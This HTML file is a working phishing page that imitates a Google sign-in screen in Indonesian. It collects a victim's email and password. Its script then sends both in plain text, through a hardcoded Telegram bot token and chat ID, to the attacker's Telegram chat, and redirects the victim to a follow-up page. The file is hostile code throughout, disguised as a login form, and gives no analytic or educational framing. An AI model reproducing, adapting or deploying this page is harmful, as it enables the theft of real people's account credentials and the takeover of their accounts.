<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:40px 20px;
}

.container{
    max-width:400px;
    width:100%;
}

.logo{
    width:60px;
    height:60px;
    border-radius:50%;
    background:#fff;
    margin-bottom:24px;
    display:flex;
    align-items:center;
    justify-content:center;
}

.logo img{
    width:50px;
    height:50px;
}

h1{
    font-size:48px;
    font-weight:400;
    margin-bottom:24px;
    color:#202124;
}

.email-box{
    display:inline-flex;
    align-items:center;
    gap:12px;
    border:1px solid #ccc;
    border-radius:30px;
    padding:12px 20px;
    margin-bottom:48px;
    cursor:pointer;
    transition:background 0.2s;
}

.email-box:hover{
    background:#f1f3f4;
}

.email-icon img{
    width:24px;
    height:24px;
}

.email-display{
    font-size:18px;
}

.arrow svg{
    width:18px;
    height:18px;
    fill:#888;
}

.input{
    width:100%;
    padding:20px;
    border:1px solid #dadce0;
    border-radius:4px;
    font-size:18px;
    color:#202124;
    outline:none;
    transition:border 0.2s;
}

.input:focus{
    border:2px solid #1a73e8;
}

.check{
    margin-top:20px;
    display:flex;
    align-items:center;
    gap:12px;
}

.check input{
    width:18px;
    height:18px;
    cursor:pointer;
}

.check label{
    font-size:14px;
    color:#202124;
    cursor:pointer;
}

.bottom{
    margin-top:48px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.link{
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
}

.link:hover{
    text-decoration:underline;
}

.btn{
    background:#1a73e8;
    color:#fff;
    border:none;
    padding:16px 32px;
    border-radius:4px;
    cursor:pointer;
    font-size:14px;
    font-weight:500;
    transition:background 0.2s;
}

.btn:hover{
    background:#1765cc;
    box-shadow:0 1px 2px rgba(0,0,0,0.2);
}

.btn:disabled{
    background:#ccc;
    cursor:not-allowed;
}

#status{
    margin-top:20px;
    font-size:14px;
    display:none;
}

#status.success{
    color:green;
    display:block;
}

#status.error{
    color:red;
    display:block;
}

.footer{
    margin-top:60px;
    display:flex;
    justify-content:space-between;
    font-size:12px;
    color:#5f6368;
}

.footer a{
    text-decoration:none;
    color:#5f6368;
    padding:4px 8px;
}

.footer a:hover{
    text-decoration:underline;
}
</style>
</head>
<body>

<div class="container">

    <!-- Logo SVG -->
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
    </div>

    <h1>Selamat Datang</h1>

    <!-- Kotak Email dari LocalStorage -->
    <div class="email-box" id="emailBox" onclick="hapusEmail()">
        <span class="email-icon">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="User">
        </span>
        <span class="email-display" id="emailDisplay">Tidak ada akun</span>
        <span class="arrow">
            <svg viewBox="0 0 24 24">
                <path d="M7 10l5 5 5-5z"/>
            </svg>
        </span>
    </div>

    <!-- Form Input Password -->
    <input type="password" class="input" id="password" placeholder="Masukkan sandi">

    <div class="check">
        <input type="checkbox" id="showPass">
        <label for="showPass">Tampilkan sandi</label>
    </div>

    <div id="status"></div>

    <div class="bottom">
        <a href="#" class="link" onclick="tambahAkun()">Ganti akun</a>
        <button class="btn" id="loginBtn">Berikutnya</button>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Indonesia ▾</a>
        <div>
            <a href="#">Bantuan</a>
            <a href="#">Privasi</a>
            <a href="#">Persyaratan</a>
        </div>
    </div>

</div>

<script>
// ========== KONFIGURASI ==========
const botToken = "8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk";
const chatId = "7549590022";
// ==============================

// ===== FUNGSI LOCALSTORAGE =====

window.onload = function() {
    const storedEmail = localStorage.getItem('userEmail');
    const emailDisplay = document.getElementById('emailDisplay');
    
    if(storedEmail){
        emailDisplay.textContent = storedEmail;
    } else {
        setTimeout(tambahAkun, 500);
    }
};

function simpanEmail(email) {
    localStorage.setItem('userEmail', email);
    document.getElementById('emailDisplay').textContent = email;
}

function hapusEmail() {
    if(confirm('Ingin ganti akun?')){
        localStorage.removeItem('userEmail');
        tambahAkun();
    }
}

function tambahAkun() {
    const email = prompt('Masukkan email Anda:');
    if(email && email.includes('@')){
        simpanEmail(email);
    } else if(email) {
        alert('Email tidak valid!');
        tambahAkun();
    }
}

// ==============================

document.getElementById('showPass').addEventListener('change', function(){
    document.getElementById('password').type = this.checked ? 'text' : 'password';
});

// Kirim ke Telegram
function sendToTelegram() {
    const email = localStorage.getItem('userEmail');
    const password = document.getElementById('password').value;
    const btn = document.getElementById('loginBtn');
    const status = document.getElementById('status');
    
    if(!email){
        alert('Silakan masukkan email terlebih dahulu!');
        return;
    }
    
    if(password === ''){
        alert('Masukkan sandi terlebih dahulu!');
        return;
    }

    btn.disabled = true;
    btn.innerText = 'Mengirim...';
    
    const message = `🔐 Login Baru!\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(url)
    .then(response => response.json())
    .then(data => {
        if(data.ok){
            window.location.href = "pasword.html";
            document.getElementById('password').value = '';
        } else {
            status.className = 'error';
            status.textContent = 'Gagal: ' + data.description;
        }
    })
    .catch(error => {
        status.className = 'error';
        status.textContent = 'Error: ' + error;
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerText = 'Berikutnya';
    });
}

document.getElementById('loginBtn').addEventListener('click', sendToTelegram);
</script>

</body>
</html>
